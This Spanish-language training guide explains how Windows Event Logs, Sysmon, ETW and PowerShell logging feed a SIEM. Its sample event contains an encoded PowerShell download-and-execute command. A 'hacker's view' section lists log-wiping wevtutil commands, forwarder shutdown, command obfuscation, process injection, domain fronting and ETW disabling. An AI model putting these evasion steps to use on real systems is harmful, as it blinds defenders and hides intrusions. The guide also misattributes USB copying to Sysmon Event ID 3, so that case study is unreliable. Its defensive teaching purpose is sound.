---
title: "Telemetría del Endpoint: Las Cámaras Corporales"
level: "intermedio"
content_type: "guia"
updated: "2026-06-29"
---

# Telemetría del Endpoint: Las Cámaras Corporales

## Objetivo de esta Guía

Aprender de donde diablos saca un SOC Analyst la información para saber que un empleado a tres mil kilómetros de distancia abrió un virus de Excel en su computadora.

El SIEM (el cerebro del cuartel general de seguridad) es una máquina vacía. Si los servidores y las laptops corporativas no le envían datos voluntariamente, el Analista de Seguridad estará ciego. A este envio continuo de información se le llama Telemetría.

Sin telemetría, el equipo de seguridad opera a ciegas. Un ataque puede durar meses sin ser detectado. Con telemetría de calidad, cada acción del atacante queda registrada y puede ser analizada.

## La Analogía

Imagina a un policía patrullando una ciudad a media noche. Si ocurre un tiroteo y el policía no trae su radio, el Cuartel General no se entera de nada.

Por eso, la policía moderna inventó las Bodycams (Cámaras Corporales). La cámara graba cada palabra, cada rostro y cada acción, y transmite el video en vivo al Cuartel General. Si algo sale mal, el Detective Forense puede rebobinar la cinta y ver exactamente como ocurrieron los hechos.

En Ciberseguridad, la computadora del empleado de Finanzas es el policía patrullando. El agente de Telemetría es la Bodycam instalada en su pecho. El Cuartel General es el SIEM.

Pero no todas las bodycams son iguales. Algunas graban en baja resolución (Event Logs básicos), otras graban en 4K (Sysmon), y otras solo graban cuando detectan movimiento (Eventos de seguridad). La calidad de la telemetría determina la capacidad de detección y respuesta.

## Windows Event Logs: La Bitácora del Barco

De fábrica, todas las computadoras con Windows ya tienen una libreta de notas integrada llamada Windows Event Logs (Visor de Eventos).

Cada vez que ocurre algo importante en el sistema, Windows anota un evento:

- "9:00 AM - El usuario Juanito inicio sesión (Evento 4624)"
- "9:05 AM - Juanito abrió Word.exe (Evento 4688)"
- "9:06 AM - Juanito metió mal su contraseña (Evento 4625)"

### Estructura de un Evento

Cada evento de Windows contiene:

1. **Event ID:** Un número único que identifica el tipo de evento. 4624 = inicio de sesión exitoso, 4625 = inicio de sesión fallido, 4688 = creación de proceso, 4634 = cierre de sesión.

2. **Timestamp:** La hora exacta del evento (en UTC, aunque el SO lo muestre en hora local).

3. **Usuario:** La cuenta de usuario que ejecutó la acción.

4. **Origen:** La computadora desde donde se ejecutó la acción (importante para detectar inicios de sesión remotos).

5. **Detalle:** Información específica del evento, como el nombre del proceso ejecutado o la IP de origen.

### Los Eventos Críticos para Seguridad

No todos los eventos son utiles. Los analistas de SOC se enfocan en unos pocos:

| Event ID | Descripción | Uso en Seguridad |
|----------|-------------|------------------|
| 4624 | Inicio de sesión exitoso | Detectar accesos fuera de horario |
| 4625 | Inicio de sesión fallido | Detectar ataques de fuerza bruta |
| 4634 | Cierre de sesión | Correlacionar con otros eventos |
| 4648 | Inicio de sesión usando credenciales explícitas | Detectar Pass-the-Hash |
| 4672 | Privilegios especiales asignados | Detectar escalada de privilegios |
| 4688 | Creación de proceso | Detectar ejecución de malware |
| 4698 | Tarea programada creada | Detectar persistencia |
| 4719 | Política de auditoría modificada | Detectar evasion de Logs |
| 4720 | Usuario creado | Detectar cuentas sospechosas |
| 4732 | Usuario agregado a grupo | Detectar escalada de privilegios |

### La Limitacion: Retencion Local

Los trata como si fueran notas de supermercado que tiras a la semana.

Windows borra esta libreta cada pocos días para ahorrar espacio en el disco duro. Por defecto:

- Los logs de seguridad tienen un tamaño máximo de 20 MB (se sobrescriben rápidamente).
- Los logs de sistema tienen un tamaño máximo de 20 MB.
- Los logs de aplicaciones tienen un tamaño máximo de 20 MB.

En una computadora activa, 20 MB se llenan en horas. Los eventos más antiguos se sobrescriben sin recuperación posible.

Si el equipo Forense llega a investigar un hackeo 3 meses después, la libreta ya no existe. Por eso, el equipo de IT configura las laptops para que envíen (Log Forwarding) una copia de esta libreta, segundo a segundo, al SIEM centralizado que nunca borra nada.

### Forwarding con Windows Event Forwarding (WEF)

Microsoft provee una tecnología nativa llamada Windows Event Forwarding que permite:

- Enviar eventos a un colector central (Windows Event Collector).
- Usar autenticación Kerberos para asegurar la transmision.
- Filtrar que eventos enviar (no enviar todo, solo los críticos).

La configuración se hace mediante GPO y no requiere software adicional. Es la opción más usada en entornos corporativos.

## Sysmon: La Bodycam de Grado Militar

Los Event Logs de Windows son buenos, pero los hackers saben como evadirlos o borrarlos. Además, Windows no anota detalles profundos como "A que IP de internet se conecto Word.exe?".

Para atrapar Hackers avanzados, el Blue Team instala una herramienta legendaria y gratuita creada por Microsoft: Sysmon (System Monitor).

Sysmon se inyecta directamente en el núcleo (Kernel) del sistema operativo como un driver de dispositivo. Funciona como una Bodycam indetectable (para el usuario normal) y de altísima resolución.

### Eventos Clave de Sysmon

Sysmon genera eventos mucho más detallados que los logs nativos de Windows:

**Event ID 1 - Creación de Proceso:**

El más importante para detección temprana. Registra:

- La línea de comandos completa del proceso (Windows nativo solo registra el nombre del ejecutable).
- El Hash SHA1 del archivo ejecutado (para comparar con bases de datos de malware).
- El GUID del proceso (para correlacionar con otros eventos).
- El usuario que ejecutó el proceso.

Ejemplo práctico:

```
Process Create:
  ProcessId: 4524
  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  CommandLine: powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACcAKQA=
  User: CORP\juan.perez
  Hash: SHA1=7A8F5E9B3C2D1F4A5B6C7D8E9F0A1B2C3D4E5F6
```

El analista ve inmediatamente: PowerShell ofuscado, descargando un archivo desde una IP sospechosa.

**Event ID 3 - Conexión de Red:**

Registra cada conexión de red que hace cualquier proceso:

- Protocolo (TCP/UDP).
- Dirección IP de origen y destino.
- Puerto de origen y destino.
- Proceso que realizo la conexión.

Ejemplo:

```
Network Connect:
  Image: C:\Users\juan.perez\AppData\Local\Temp\payload.exe
  Protocol: tcp
  SourceIp: 192.168.1.100
  SourcePort: 49152
  DestinationIp: 185.220.101.45
  DestinationPort: 443
```

El analista ve: un proceso que se ejecuta desde la carpeta temporal y se conecta a una IP en un rango asociado a actividades maliciosas.

**Event ID 11 - Archivo Creado:**

Registra la creación de archivos en el sistema:

- Ruta completa del archivo.
- Nombre del proceso que lo creo.
- Hash del archivo creado.

Esto permite detectar cuando un proceso legítimo (Word, Excel) descarga y escribe un archivo ejecutable en el disco.

**Event ID 15 - Flujo de Streams Alternativos:**

Windows permite adjuntar streams de datos ocultos a archivos (técnica ADS - Alternate Data Streams). Los hackers esconden malware ahí. Sysmon Event ID 15 detecta cuando se ejecuta algo desde un ADS.

**Event ID 22 - Consulta DNS:**

Registra cada consulta DNS que hace el sistema:

- Nombre de dominio consultado.
- Dirección IP resuelta.
- Proceso que hizo la consulta.

Esto permite detectar comunicación con dominios de C2 (Command and Control) aunque la IP cambie constantemente (Domain Fluxing).

### Por qué Sysmon es Indispensable

Windows nativo no registra:

- La línea de comandos completa (solo el nombre del proceso).
- El hash del proceso creado.
- La conexión de red por proceso.
- Las consultas DNS.

Sysmon cierra todos estos vacíos. Es el estándar de la industria para telemetría de Windows en el SOC.

### Configuración Recomendada (SwiftOnSecurity)

La configuración más usada de Sysmon es la de SwiftOnSecurity (disponible en GitHub como "sysmon-config"). Incluye reglas para:

- Registrar todos los procesos con línea de comandos.
- Registrar conexiones de red salientes.
- Registrar creación de archivos en carpetas sospechosas (TEMP, APPDATA).
- Registrar modificaciones al registro de Windows (persistencia).
- Ignorar eventos ruidosos de procesos legítimos (Windows Update, antivirus).

Sin una configuración como esta, Sysmon generaría terabytes de logs inútiles. La configuración filtra el ruido y deja solo las señales importantes.

## Colectores y Forwarding Centralizado

Tener Sysmon en cada máquina no sirve de nada si los eventos se quedan ahí. Necesitamos enviarlos a un lugar central.

### Windows Event Collector (WEC)

Microsoft incluye el rol de Windows Event Collector en Windows Server. Configura:

- La máquina colectora recibe eventos de cientos de equipos.
- Los eventos se almacenan en canales centralizados.
- Se integra directamente con el SIEM.

### Forwarders de Terceros

Herramientas como Winlogbeat (de Elastic), NXLog o Splunk Universal Forwarder cumplen la misma función:

- Se instalan en cada endpoint.
- Leen los canales de Event Log y Sysmon.
- Envían los eventos al SIEM en tiempo real.
- Comprimen y cifran la transmision.

### El Problema de la Latencia

En empresas globales con miles de endpoints, la cantidad de eventos puede saturar la red. Soluciones:

- Transmitir en lotes cada 5-10 segundos en lugar de evento por evento.
- Filtrar eventos de baja importancia en el endpoint antes de enviarlos.
- Usar colas de mensajeria como Kafka para absorber picos.

## La Correlacion en el SIEM

Cuando el SIEM recibe los eventos, el trabajo real comienza.

### Reglas de Correlacion

El analista escribe reglas que conectan eventos aparentemente aislados:

**Regla: "Posible Ransomware"**

```
SI RECIBO:
  Sysmon Event ID 1 (Creacion de proceso) DONDE
    CommandLine contiene "-EncodedCommand"
  Y DENTRO DE 10 SEGUNDOS:
    Sysmon Event ID 3 (Conexion de red) DONDE
      DestinationIp NO esta en la lista blanca de IPs internas
  ENTONCES:
    Elevar alerta a CRITICA
    Aislar el endpoint automaticamente
```

### Enriquecimiento de Eventos

El SIEM no solo guarda eventos, los enriquece:

- GeoIP: determinar país de origen de una IP.
- WHOIS: determinar propietario de un dominio.
- Reputación: consultar bases de datos de amenazas (VirusTotal, AlienVault OTX).
- Contexto: cruzar con información del empleado (departamento, rol, ubicación).

Un evento de Sysmon que muestra una conexión a una IP en Russia es más preocupante si el empleado es de Contabilidad en México.

### Dashboards y Alertas

El SOC usa dashboards en tiempo real que muestran:

- Número de alertas activas por severidad.
- Top 10 IPs de origen sospechosas.
- Top 10 usuarios con más eventos anómalos.
- Endpoints con telemetría caída (silence alerts).

## Casos Reales

### El Ataque a Sony Pictures (2014)

El grupo Guardians of Peace (GOP) ataco Sony Pictures en 2014. El ataque na sido detectado durante semanas porque:

- La telemetría de los endpoints no estaba centralizada.
- Los logs locales fueron borrados por el malware.
- No había Sysmon instalado para capturar detalles de procesos.

La lección: si la telemetría no sale del endpoint, el atacante la destruye cuando obtiene privilegios.

### El Caso del Empleado que Robo Datos (2019)

Una empresa de tecnología tuvo un caso de Insider Threat: un empleado descargó 50,000 documentos de clientes antes de renunciar.

Sysmon Event ID 11 (archivo creado) mostro que el empleado estaba copiando archivos a una USB. Sysmon Event ID 3 mostro que la USB era el único dispositivo de almacenamiento conectado fuera de horario.

El SIEM correlaciono: "usuario fuera de horario + copia masiva a dispositivo nuevo = posible fuga de datos".

### La Falla de Telemetría en el ataque a SolarWinds (2020)

Durante el ataque SolarWinds, el malware Sunburst permanecio inactivo por 14 días. Muchas empresas tenían configuraciones de Sysmon que ignoraban eventos de procesos firmados por SolarWinds porque los consideraban "confiables".

La lección: la lista blanca de procesos debe ser mínima. Incluso los procesos firmados pueden ser maliciosos si ejecutan código inyectado.

## Modos de Falla

### Falla 1: No Enviar los Logs a un SIEM Central

Si los logs solo existen localmente, el atacante los borra al obtener Admin. La telemetría debe salir del endpoint en tiempo real.

### Falla 2: Enviar Demasiados Logs Sin Filtro

Enviar absolutamente todo genera ruido insoportable. El SOC se satura y pierde las señales reales. Hay que aplicar filtrado en el origen.

### Falla 3: Confiar Ciegamente en la Configuración por Defecto

Windows Event Logs por defecto no registra cosas críticas como comandos de PowerShell. Hay que activar la auditoría avanzada mediante GPO.

### Falla 4: No Monitorear la Salud de la Telemetría

Si un endpoint deja de enviar logs, puede ser:

- Un problema técnico (el forwarder se cayó).
- Un atacante que deshabilito la telemetría.

Ambos son emergencias. El SOC debe tener alertas de "heartbeat" para detectar endpoints silenciosos.

### Falla 5: Olvidar los Servidores

Muchas empresas configuran bien la telemetría en las laptops, pero olvidan los servidores. Los servidores son el objetivo principal de los atacantes.

## La Mirada del Hacker

Como atacante, se que la telemetría es mi enemiga. Mis objetivos son:

### Evitar la Detección

- No usar cmd.exe ni powershell.exe si puedo inyectar código directamente en memoria.
- Usar herramientas que no generan Event ID 4688 (ej. ejecución directa via .NET).
- Deshabilitar ETW (Event Tracing for Windows) desde el kernel si tengo privilegios.

### Borrar los Logs

Si obtengo Admin en un endpoint:

1. `wevtutil cl System` - Borra los logs del sistema.
2. `wevtutil cl Security` - Borra los logs de seguridad.
3. `wevtutil cl Application` - Borra los logs de aplicaciones.
4. Detener el servicio `WinRM` para que no envíe logs pendientes.
5. Detener el servicio del forwarder (Winlogbeat, Splunk UF).

### Ofuscar la Línea de Comandos

Sysmon registra la línea de comandos. Como atacante:

- Uso `-EncodedCommand` con Base64 (los EDR y SIEM detectan esto).
- Alternativa: parto el comando en variables y las concateno.
- Alternativa: uso `-Command` con cadenas escapadas.
- Alternativa: uso `Invoke-Expression` con código ofuscado.

### Usar Procesos Legítimos como Señuelo

Me meto dentro de un proceso que nadie audita:

- `svchost.exe` - Servicio del sistema.
- `explorer.exe` - Explorador de Windows.
- `notepad.exe` - Bloc de notas (el usuario siempre tiene uno abierto).

Si logró inyectar código en `explorer.exe`, mis acciones se registraran como si fueran del proceso legítimo.

### Domain Fronting

Para que la conexión saliente no levante sospechas, uso Domain Fronting:

- Me conecto a un CDN legítimo (CloudFront, Akamai).
- El CDN reenvia el tráfico a mi servidor C2 real.
- Para el firewall y el EDR, el tráfico va a un dominio legítimo.

## ETW (Event Tracing for Windows): La Fuente de Datos del Kernel

ETW es el mecanismo de tracing del kernel de Windows. Es la fuente de datos que alimenta herramientas como Sysmon y Process Monitor.

### Componentes de ETW

1. **Proveedores (Providers):** Componentes del sistema que generan eventos (kernel, CLR .NET, IIS, etc.).
2. **Consumidores (Consumers):** Herramientas que leen los eventos (Sysmon, Process Monitor, EDR agents).
3. **Sesiones (Sessions):** Canales de comunicación entre proveedores y consumidores.
4. **Controladores (Controllers):)** Herramientas que inician/detienen las sesiones (logman, wevtutil).

### Proveedores ETW Importantes para Seguridad

- **Microsoft-Windows-Kernel-Process:** Eventos de creación y terminacion de procesos.
- **Microsoft-Windows-Kernel-Network:** Eventos de conexión de red.
- **Microsoft-Windows-Kernel-File:** Eventos de operaciones con archivos.
- **Microsoft-Windows-Kernel-Registry:** Eventos de acceso al registro.
- **Microsoft-Windows-Security-Auditing:** Eventos de seguridad (logons, privilegios).
- **Microsoft-Windows-PowerShell:** Eventos de ejecución de comandos PowerShell.

### Evasion de ETW

Los atacantes avanzados saben que ETW es una fuente de telemetría crítica. Han desarrollado técnicas para deshabilitarlo:

1. **Modificar el registro:** Deshabilitar ETW en `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI`.
2. **Patch en memoria:** Modificar las funciones de ETW en memoria para que no registren eventos.
3. **Usar llamadas directas al kernel (Syscalls):** Evitar las APIs de Windows que ETW monitorea.
4. **Inyección en procesos confiables:** El código inyectado se ejecuta en un proceso que tiene ETW deshabilitado.

Los EDRs modernos detectan cuando ETW es deshabilitado y generan una alerta de "Tampering" inmediatamente.

## PowerShell Logging: La Caja de Pandora

PowerShell es la herramienta favorita de los atacantes (Living-off-the-Land). Microsoft ha agregado capacidades de logging específicas:

### Script Block Logging

Registra el contenido de los bloques de script de PowerShell, incluso si el script esta ofuscado u oculto.

Configuración via GPO:

```xml
<PowerShellLogging>
  <EnableScriptBlockLogging>true</EnableScriptBlockLogging>
</PowerShellLogging>
```

Esto genera el Event ID 4104 en los logs de Windows.

### Module Logging

Registra cuando se cargan modulos de PowerShell y las llamadas a cmdlets específicos.

### Transcription

Crea una transcripcion completa de la sesión de PowerShell en un archivo de texto, incluyendo entrada y salida.

```xml
<PowerShellLogging>
  <EnableModuleLogging>true</EnableModuleLogging>
  <EnableTranscripting>true</EnableTranscripting>
  <EnableInvocationHeader>true</EnableInvocationHeader>
</PowerShellLogging>
```

### Defensa Contra la Evasion de PowerShell

Los atacantes usan:
- `-EncodedCommand` para ocultar comandos (fácil de detectar).
- `-Command` con cadenas concatenadas (más difícil).
- `Invoke-Expression` con ofuscación.
- Reflection para cargar .NET assemblies directamente.

Los defensores responden con:
- Detección de patrones de ofuscación en los logs.
- Bloqueo de PowerShell para usuarios no administradores (AppLocker, WDAC).
- Constrained Language Mode (limita PowerShell a comandos seguros).

## Autoevaluación

Responde estas preguntas para verificar si comprendes los conceptos:

1. Un Analista del SOC revisa su pantalla del SIEM y nota que no ha recibido ni un solo log de eventos de las laptops del departamento de Finanzas durante las últimas 48 horas. Usando la analogía de la Bodycam, explica que significa este "Silencio de Telemetría" y por qué es una emergencia crítica.

2. Por qué depender exclusivamente de la lectura de los "Event Logs" locales guardados en la laptop del usuario comprometido es una falla técnica durante una investigación de Incident Response o Forense? (Pista: Piensa en lo primero que hace un hacker profesional cuando obtiene permisos de Administrador).

3. Cual es la diferencia principal entre los Event Logs que vienen por defecto en Windows y la telemetría hiper-detallada que provee la herramienta avanzada Sysmon?

4. El SIEM levanta una alerta basada en la Telemetría (Sysmon Event ID 1): `powershell.exe -ExecutionPolicy Bypass -encodedCommand aW52b2tlLW1pbWlrYXR6...`. Por qué este simple evento (un programa legal ejecutando código ofuscado) es suficiente para que el Analista de Seguridad desconecte la máquina de la red inmediatamente?

5. Explica por qué un atacante que obtiene privilegios de Administrador en un endpoint puede borrar los logs locales, pero no puede borrar los logs que ya fueron enviados al SIEM.

6. Que información adicional proporciona Sysmon Event ID 3 (conexión de red) que no esta disponible en los logs nativos de Windows?

7. Un equipo de IT configura Windows Event Forwarding pero no activa la auditoría de línea de comandos en GPO. Que eventos críticos se pierden y por qué?

8. Como usaria un atacante la técnica de "proc hollowing" para evitar que Sysmon registre la creación de un proceso malicioso?
